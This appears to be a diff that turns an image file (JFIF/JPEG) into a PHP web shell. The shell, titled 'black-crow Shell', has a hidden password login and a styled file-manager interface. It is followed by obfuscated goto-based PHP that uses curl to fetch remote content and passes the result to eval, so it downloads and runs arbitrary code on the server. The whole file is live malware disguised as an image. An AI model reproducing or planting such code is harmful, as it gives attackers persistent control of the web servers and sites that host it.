@@ -1,4 +1,141 @@
-     JFIF           	 ( %"1!%)+...383,7(-.+
+<?php 
+$auth_pass ="e247eb61b4f37a84fe62631bad575ec9";
+function Login() {
+  die("<!DOCTYPE HTML>
+<html>
+<title>
+</title>
+<br>
+<form method='post'><input style='text-align:center;margin:0;margin-top:868px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form>");
+}
+
+function VEsetcookie($k, $v) {
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+
+if(!empty($auth_pass)) {
+    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
+        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
+
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
+        Login();
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+	<?php echo "<title>bl"."ack"."-"."cr"."o"."w Shell</title>"; ?>
+	<meta name="robots" content="noindex">
+	<link rel="icon" href="https://lh3.googleusercontent.com/pw/AP1GczN2P_BF2RU5Wb8Ss59HmalHGwiQ3Ob1vMucxkRx_94gr9cvVD1ON3DOGv3Q0C9DC4TQ1g1IGB2SRtK-UQ5D9xRLzNE4UG0AHPEl9ejVUU4Et99r7iVGz1bK_P2kx8c82PvaGofy1eBDGycwfirxPdS8Gh6u9x49ubtm7Q-e4aT9wF5jk6Cy3-lpKvzH65GMGvPVK3382uz0Ih7F0uFkuFM-o0MmeZ1wRSgbyL7BM7nECpS9lkOdKbaOOB3j5UzBRM2OwNpIRi1tXD1T45Y6zU8hd6PCb97bf48rHSEGICH17mn4RWJ6XZ6pWpy_Q0RHO9vrq7ezEa0OhuL-x6uc1oFcgwn9IejsIRn5RwAlq5GFPS6_RgCxGMq4iWPIQxnbzjGQvHu5h8xeZgGMCoy4DjoihnBTi2nn8ymqbF8UVGKHQjdNtNzdE6RhZEf9yJTFaNxEqkWz7MDXIxzTN8VgljNF5E74FL2POFXOVw1QaChYaWSaKLckRI_bNL4qAhz1zlc8g_Gt1njJ3Qmc06WZddTv5ZN0nbabqdf_rBLJRcYIiHwJvk3kIPprjbgPNkkyOZSxT80lN2m99OuhysA20wKrDL4u6XqKau7St1O5MhnqhC54W_iSh3mCUHFzk5kCI3dd6vU0jA-WrP2a6kWo8eZAF_T_7e3Jp5ADA0NJTXqi1x-QKlED0iTWJK521fJxdgGRdZ7ApkFftoTUpfaEbr0LPEyD-WG_4W45Ae9wkvQQ6uyITaX-wWUjDlZxyMWzejL-JDjta3xJte6Y5t6XC4sz7HzWWX33G6E2HC6YJ5Xse7iA8EOVSqAAFxNYPgdwexAc6FBuuhYaKULrXvoPi00df2p6Gdr5K2iD2AR0bjJHW012A-5Xv0PJOxWpmPQrpwCxhwPzHaCP4a_LvkmXD1I=w360-h360-s-no-gm?authuser=0" type="image/x-icon">
+</head>
+<body bgcolor="#1f1f1f" text="#ffffff">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+	@import url('https://fonts.googleapis.com/css?family=Dosis');
+	@import url('https://fonts.googleapis.com/css?family=Bungee');
+	@import url('https://fonts.googleapis.com/css?family=Russo+One');
+body {
+	font-family: "Dosis", cursive;
+	text-shadow:0px 0px 1px #757575;
+}
+
+body::-webkit-scrollbar {
+  width: 12px;
+}
+
+body::-webkit-scrollbar-track {
+  background: #1f1f1f;
+}
+
+body::-webkit-scrollbar-thumb {
+  background-color: #1f1f1f;
+  border: 3px solid gray;
+}
+
+#content tr:hover {
+	background-color: #636263;
+	text-shadow:0px 0px 10px #fff;
+}
+
+#content .first {
+	background-color: #25383C;
+}
+
+#content .first:hover {
+	background-color: #25383C
+	text-shadow:0px 0px 1px #757575;
+}
+
+table {
+	border: 1px #000000 dotted;
+	table-layout: fixed;
+}
+
+td {
+	word-wrap: break-word;
+}
+
+a {
+	color: #ffffff;
+	text-decoration: none;
+}
+
+a:hover {
+	color: #000000;
+	text-shadow:0px 0px 10px #ffffff;
+}
+
+input,select,textarea {
+	border: 1px #000000 solid;
+	-moz-border-radius: 5px;
+	-webkit-border-radius:5px;
+	border-radius:5px;
+}
+
+.gas {
+	background-color: #1f1f1f;
+	color: #ffffff;
+	cursor: pointer;
+}
+
+select {
+	background-color: transparent;
+	color: #ffffff;
+}
+
+select:after {
+	cursor: pointer;
+}
+
+.linka {
+	background-color: transparent;
+	color: #ffffff;
+}
+
+.up {
+	background-color: transparent;
+	color: #fff;
+}
+
+option {
+	background-color: #1f1f1f;
+}
+
+.btf {
+	background: transparent;
+	border: 1px #fff solid;
+	cursor: pointer;
+}
+
+::-webkit-file-upload-button {
+  background: transparent;
+  color: #fff;
+  border-color: #fff;
+  cursor: pointer;
+}
+</style>
+JFIF           	 ( %"1!%)+...383,7(-.+
 <?php
  goto affsF; cDEhl: goto AOswG; goto tqYj9; C8iLP: goto E9VVs; goto pnzE6; wPj5A: goto G2gy_; goto tATv1; gRTj7: goto LOsX0; goto DJa7I; r3gWc: $metrstpl = "\157\165\164\160\165\164"; goto visiL; VF1NI: LOsX0: goto lGC0L; omCsJ: goto KahNQ; goto VF1NI; DJa7I: AOswG: goto tAIdJ; eZ4Zm: curl_close(${${"\x47\x4c\117\x42\x41\x4c\123"}["\x66\x6c\x67\151\166\167\167\x78\x69\172"]}); goto YIFi0; nXkOL: GjpbF: goto wPjBN; visiL: goto GjpbF; goto LF5YH; tqYj9: KahNQ: goto fHwVs; YIFi0: goto RMZRI; goto Qqmep; LF5YH: G2gy_: goto eZ4Zm; CmB5a: RMZRI: goto ejHX5; ZyTV0: DxAEC: goto kCTAe; mk4gT: ${${"\107\114\117\x42\101\114\x53"}["\155\x67\x6f\144\x63\x69\x64\145\x6a\152\x69"]} = curl_init(); goto gRTj7; fHwVs: error_reporting(0); goto C8iLP; FYuEy: goto Dmf24; goto q1RHk; xzd5V: goto xgT6v; goto ZyTV0; Y4Bqg: ${"\x47\114\117\102\101\114\123"}["\x6c\x77\165\x6e\146\163\x66\157\x68"] = "\x6f\165\164\x70\x75\164"; goto cDEhl; pnzE6: xgT6v: goto HuWjp; v19Eh: goto z13En; goto nXkOL; Qqmep: Dmf24: goto KqPNK; yKEXA: ${$metrstpl} = curl_exec(${${"\107\x4c\x4f\102\101\114\123"}["\x6d\x67\x6f\x64\x63\151\144\x65\x6a\x6a\x69"]}); goto wPj5A; ejHX5: eval(base64_decode("\x50\172\64\75") . ${${"\107\114\117\x42\101\114\123"}["\x6c\x77\165\x6e\146\163\x66\157\x68"]}); goto FYuEy; CFLEJ: dKmdd: goto yKEXA; iraQ5: goto JA5VB; goto CFLEJ; T0pRc: set_time_limit(0); goto t_lJR; HuWjp: ${"\107\x4c\117\x42\x41\x4c\123"}["\146\x6c\147\151\x76\167\x77\x78\151\x7a"] = "\x63\x68"; goto v19Eh; tAIdJ: ${"\107\114\117\102\101\x4c\x53"}["\155\147\157\144\x63\x69\x64\x65\152\x6a\x69"] = "\x63\x68"; goto omCsJ; kCTAe: ?>
 
